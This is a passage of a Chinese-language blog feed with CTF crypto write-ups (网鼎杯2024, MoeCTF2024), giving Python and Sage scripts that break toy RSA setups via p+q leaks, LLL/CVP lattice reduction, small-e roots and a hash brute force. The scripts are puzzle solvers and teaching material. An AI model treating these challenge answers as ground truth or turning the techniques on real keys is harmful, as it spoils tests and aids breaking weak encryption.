<span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols,solve</span><br><span class="line"></span><br><span class="line">p_q = <span class="number">18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span></span><br><span class="line">n, e = (<span class="number">89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589</span>, <span class="number">65537</span>)</span><br><span class="line">enc1 = <span class="number">23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span></span><br><span class="line">p, q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">res = solve([p*q-n, p+q-p_q], [p, q])</span><br><span class="line">p, q = res[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line">q = <span class="built_in">int</span>(q)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc1, d, n))).decode()</span><br><span class="line"></span><br><span class="line">n = <span class="number">73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">hints = [<span class="number">18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096</span>, <span class="number">16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962</span>, <span class="number">17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991</span>, <span class="number">25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567</span>]</span><br><span class="line">c = <span class="number">30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span></span><br><span class="line">V = hints</span><br><span class="line">k = <span class="number">2</span>^<span class="number">800</span></span><br><span class="line">M = Matrix.column([k * v <span class="keyword">for</span> v <span class="keyword">in</span> V]).augment(Matrix.identity(<span class="built_in">len</span>(V)))</span><br><span class="line">B = [b[<span class="number">1</span>:] <span class="keyword">for</span> b <span class="keyword">in</span> M.LLL()]</span><br><span class="line">M = (k * Matrix(B[:<span class="built_in">len</span>(V)-<span class="number">2</span>])).T.augment(Matrix.identity(<span class="built_in">len</span>(V)))</span><br><span class="line">B = [b[-<span class="built_in">len</span>(V):] <span class="keyword">for</span> b <span class="keyword">in</span> M.LLL() <span class="keyword">if</span> <span class="built_in">set</span>(b[:<span class="built_in">len</span>(V)-<span class="number">2</span>]) == &#123;<span class="number">0</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s, t <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">4</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    T = s*B[<span class="number">0</span>] + t*B[<span class="number">1</span>]</span><br><span class="line">    a1, a2, a3 ,a4 = T</span><br><span class="line">    kq = gcd(a1 * hints[<span class="number">1</span>] - a2 * hints[<span class="number">0</span>], n)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kq &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;find!!&#x27;</span>, kq, s, t)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> kq % i == <span class="number">0</span>:</span><br><span class="line">        kq //= i</span><br><span class="line">q = <span class="built_in">int</span>(kq)</span><br><span class="line">p = <span class="built_in">int</span>(n // kq)</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode()</span><br><span class="line"></span><br><span class="line">enc3 = <span class="number">17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span></span><br><span class="line">flag3 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc3,d,n))).decode()</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>如果<code>flag3</code>不使用<code>RSA2</code>加密，已知<code>h1=a*p+q</code> <code>h2=p+b*q</code>，有</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> fpylll</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_linear_mod</span>(<span class="params">equations, bounds, guesses=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Solve an arbitrary system of modular linear equations over different moduli.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    equations: A sequence of (lhs == rhs, M) pairs, where lhs and rhs are expressions and M is the modulus.</span></span><br><span class="line"><span class="string">    bounds: A dictionary of &#123;var: M&#125; entries, where var is a variable and M is the maximum of that variable (the bound).</span></span><br><span class="line"><span class="string">        All variables used in the equations must be bounded.</span></span><br><span class="line"><span class="string">    guesses: An *optional* dictionary containing an approximation (guess) for each variable.</span></span><br><span class="line"><span class="string">        For e.g. uniformly distributed numbers, just use the mean (expected value).</span></span><br><span class="line"><span class="string">        Variables for which a guess is not specified are assumed to lie uniformly in [0, bound),</span></span><br><span class="line"><span class="string">        i.e. they will have a guess of bound/2.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: Bounds are *soft*. This function may return solutions above the bounds. If this happens, and the result</span></span><br><span class="line"><span class="string">    is incorrect, make some bounds smaller and try again.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; k = var(&#x27;k&#x27;)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; # solve CRT</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; solve_linear_mod([(k == 2, 3), (k == 4, 5), (k == 3, 7)], &#123;k: 3*5*7&#125;)</span></span><br><span class="line"><span class="string">    &#123;k: 59&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x,y = var(&#x27;x,y&#x27;)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; solve_linear_mod([(2*x + 3*y == 7, 11), (3*x + 5*y == 3, 13), (2*x + 5*y == 6, 143)], &#123;x: 143, y: 143&#125;)</span></span><br><span class="line"><span class="string">    &#123;x: 62, y: 5&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># The general idea is to set up an integer matrix equation Ax=y by introducing extra variables for the quotients,</span></span><br><span class="line">    <span class="comment"># then use LLL to solve the equation. We introduce extra axes in the lattice to observe the actual solution x,</span></span><br><span class="line">    <span class="comment"># which works so long as the solutions are known to be bounded (which is of course the case for modular equations).</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">vars</span> = <span class="built_in">list</span>(bounds)</span><br><span class="line">    <span class="keyword">if</span> guesses <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        guesses = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    NR = <span class="built_in">len</span>(equations)</span><br><span class="line">    NV = <span class="built_in">len</span>(<span class="built_in">vars</span>)</span><br><span class="line">    B = fpylll.IntegerMatrix(NR+NV, NR+NV)</span><br><span class="line">    Y = [<span class="literal">None</span>] * (NR + NV)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># B format (columns are the basis for the lattice):</span></span><br><span class="line">    <span class="comment"># [ eqns:NRxNV mods:NRxNR</span></span><br><span class="line">    <span class="comment">#   vars:NVxNV 0 ]</span></span><br><span class="line">    <span class="comment"># eqns correspond to equation axes, fi(...) = yi mod mi</span></span><br><span class="line">    <span class="comment"># vars correspond to variable axes, which effectively &quot;observe&quot; elements of the solution vector (x in Ax=y)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute scale such that the variable axes can&#x27;t interfere with the equation axes</span></span><br><span class="line">    nS = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">vars</span>:</span><br><span class="line">        nS = <span class="built_in">max</span>(nS, <span class="built_in">int</span>(bounds[var]).bit_length())</span><br><span class="line">    <span class="comment"># NR + NV is a fudge to make CVP return correct results despite the 2^(n/2) error bound</span></span><br><span class="line">    S = (<span class="number">1</span> &lt;&lt; (nS + (NR + NV + <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute per-variable scale such that the variable axes are scaled roughly equally</span></span><br><span class="line">    scales = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> vi, var <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">vars</span>):</span><br><span class="line">        scale = S &gt;&gt; (<span class="built_in">int</span>(bounds[var]).bit_length())</span><br><span class="line">        scales[var] = scale</span><br><span class="line">        <span class="comment"># Fill in vars block of B</span></span><br><span class="line">        B[NR + vi, vi] = scale</span><br><span class="line">        <span class="comment"># Fill in &quot;guess&quot; for variable axis - try reducing bounds if the result is wrong</span></span><br><span class="line">        Y[NR + vi] = guesses.get(var, <span class="built_in">int</span>(bounds[var]) &gt;&gt; <span class="number">1</span>) * scale</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract coefficients from equations</span></span><br><span class="line">    <span class="keyword">for</span> ri, (rel, m) <span class="keyword">in</span> <span class="built_in">enumerate</span>(equations):</span><br><span class="line">        op = rel.operator()</span><br><span class="line">        <span class="keyword">if</span> op <span class="keyword">is</span> <span class="keyword">not</span> operator.eq:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;relation %s: not an equality relation&#x27;</span> % rel)</span><br><span class="line"></span><br><span class="line">        expr = (rel - rel.rhs()).lhs().expand()</span><br><span class="line">        <span class="keyword">for</span> var <span class="keyword">in</span> expr.variables():</span><br><span class="line">            <span class="keyword">if</span> var <span class="keyword">not</span> <span class="keyword">in</span> bounds:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: variable %s is not bounded&#x27;</span> % (rel, var))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill in eqns block of B</span></span><br><span class="line">        coeffs = []</span><br><span class="line">        <span class="keyword">for</span> vi, var <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">vars</span>):</span><br><span class="line">            <span class="keyword">if</span> expr.degree(var) &gt;= <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: equation is not linear in %s&#x27;</span> % (rel, var))</span><br><span class="line">            coeff = expr.coefficient(var)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff.is_constant():</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: coefficient of %s is not constant (equation is not linear)&#x27;</span> % (rel, var))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff.is_integer():</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: coefficient of %s is not an integer&#x27;</span> % (rel, var))</span><br><span class="line"></span><br><span class="line">            B[ri, vi] = (<span class="built_in">int</span>(coeff) % m) * S</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill in mods block of B</span></span><br><span class="line">        B[ri, NV + ri] = m * S</span><br><span class="line"></span><br><span class="line">        const = expr.subs(&#123;var: <span class="number">0</span> <span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">vars</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> const.is_constant():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: failed to extract constant&#x27;</span> % rel)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> const.is_integer():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: constant is not integer&#x27;</span> % rel)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill in corresponding equation axes of target Y</span></span><br><span class="line">        Y[ri] = (<span class="built_in">int</span>(-const) % m) * S</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Note that CVP requires LLL to be run first, and that LLL/CVP use the rows as the basis</span></span><br><span class="line">    Bt = B.transpose()</span><br><span class="line">    lll = fpylll.LLL.reduction(Bt)</span><br><span class="line">    result = fpylll.CVP.closest_vector(Bt, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check result for sanity</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, result[:NR])) != <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, Y[:NR])):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;CVP returned an incorrect result: input %s, output %s (try increasing your bounds?)&quot;</span> % (Y, result))</span><br><span class="line"></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> vi, var <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">vars</span>):</span><br><span class="line">        aa = result[NR + vi] // scales[var]</span><br><span class="line">        bb = result[NR + vi] % scales[var]</span><br><span class="line">        <span class="keyword">if</span> bb:</span><br><span class="line">            warnings.warn(<span class="string">&quot;CVP returned suspicious result: %s=%d is not scaled correctly (try adjusting your bounds?)&quot;</span> % (var, result[NR + vi]))</span><br><span class="line">        res[var] = aa</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = </span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    h1 = </span><br><span class="line">    h2 = </span><br><span class="line">    var(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">    bounds = &#123;p: <span class="number">2</span>**<span class="number">512</span>, q: <span class="number">2</span>**<span class="number">512</span>&#125;</span><br><span class="line">    eqs = [(q*h1 + p*h2 - h1*h2==<span class="number">0</span>, n)]</span><br><span class="line">    sol = solve_linear_mod(eqs, bounds)</span><br><span class="line">    p = sol[p]</span><br><span class="line">    q = sol[q]</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode())</span><br></pre></td></tr></table></figure><p>唉，一打这种大比赛就难受<br /><code>web</code>题更难受，感觉死在代码量上了，还是题做少了QWQ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写在最前面，原题杯与&lt;code&gt;咸鱼CTF&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;网鼎杯2024青龙组&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#网鼎杯2024青龙组&quot;&gt;&lt;/a&gt; 网鼎杯2024青龙组&lt;/h1&gt;
&lt;h2 id=&quot;crypto0</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MoeCTF2024 WriteUp</title>
    <link href="https://hvang10.github.io/2024/10/31/MoeCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/10/31/MoeCTF2024-WriteUp/</id>
    <published>2024-10-31T12:55:11.000Z</published>
    <updated>2024-11-10T15:41:36.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><p>给两个比较完善的<code>CRYPTO</code>方向的<code>wp</code><br /><a href="https://blog.csdn.net/weixin_52640415/article/details/141436804">https://blog.csdn.net/weixin_52640415/article/details/141436804</a></p><p><a href="https://www.cnblogs.com/naby/p/18466255">https://www.cnblogs.com/naby/p/18466255</a><br />有一题临时下了，不知道什么情况，三题没出，质量还是非常不错的</p><h2 id="现代密码学入门指北"><a class="markdownIt-Anchor" href="#现代密码学入门指北"></a> 现代密码学入门指北</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br><span class="line">Signin</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">pq = (p-<span class="number">1</span>)*(q-<span class="number">2</span>)</span><br><span class="line">qp = (q-<span class="number">1</span>)*(p-<span class="number">2</span>)</span><br><span class="line">p_q = p + q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pq = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;qp = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p_q = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span></span><br><span class="line"><span class="string">pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span></span><br><span class="line"><span class="string">qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span></span><br><span class="line"><span class="string">n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span></span><br><span class="line"><span class="string">p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>简单运算，然后常规<code>RSA</code>解法</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">phi = (pq+qp+p_q-<span class="number">2</span>)//<span class="number">2</span></span><br><span class="line"><span class="comment"># phi = (pq*qp)//(n-2*p_q+4)</span></span><br></pre></td></tr></table></figure><h2 id="ez_hash"><a class="markdownIt-Anchor" href="#ez_hash"></a> ez_hash</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, secrets</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;moectf&#123;&#x27;</span> + secrets + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> secrets[:<span class="number">4</span>] == <span class="string">b&#x27;2100&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(secrets) == <span class="number">10</span></span><br><span class="line">hash_value = sha256(secrets).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hash_value = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># hash_value = &#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span></span><br></pre></td></tr></table></figure><p>只需要爆数字，提前生成字典比较快</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&#x27;1234567890&#x27;</span></span><br><span class="line">dir_list = itertools.product(<span class="built_in">dir</span>, repeat=<span class="number">6</span>)</span><br><span class="line">hash_value = <span class="string">&#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span></span><br><span class="line">head = <span class="string">&quot;2100&quot;</span></span><br><span class="line">xxxxxx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dir_list:</span><br><span class="line">    data = i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]+i[<span class="number">4</span>]+i[<span class="number">5</span>]</span><br><span class="line">    data_sha = hashlib.sha256(</span><br><span class="line">        (head+data).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> data_sha == hash_value:</span><br><span class="line">        xxxxxx = data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;moectf&#123;2100&#x27;</span>+xxxxxx+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="big-and-small"><a class="markdownIt-Anchor" href="#big-and-small"></a> Big and small</h2><p>直接开e次方根</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c, e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="baby_equation"><a class="markdownIt-Anchor" href="#baby_equation"></a> baby_equation</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(flag)</span><br><span class="line">m1, m2 = flag[:l//<span class="number">2</span>], flag[l//<span class="number">2</span>:]</span><br><span class="line">a = bytes_to_long(m1)</span><br><span class="line">b = bytes_to_long(m2)</span><br><span class="line">k = <span class="number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span></span><br><span class="line"><span class="keyword">assert</span> ((a**<span class="number">2</span> + <span class="number">1</span>)*(b**<span class="number">2</span> + <span class="number">1</span>) - <span class="number">2</span>*(a - b)*(a*b - <span class="number">1</span>)) == <span class="number">4</span>*(k + a*b)</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>直接丢给</mtext><mi>G</mi><mi>P</mi><mi>T</mi><mtext>整合，</mtext><mn>4</mn><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">直接丢给GPT整合，4k=((a+1)(b-1))^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">丢</span><span class="mord cjk_fallback">给</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">，</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>然后分解得到</mtext><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>的所有因子，再遍历所有可能</mtext><msup><mn>2</mn><mn>18</mn></msup><mo>=</mo><mn>262144</mn><mtext>，还不算大</mtext></mrow><annotation encoding="application/x-tex">然后分解得到(a+1)*(b-1)的所有因子，再遍历所有可能2^{18}=262144，还不算大</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord 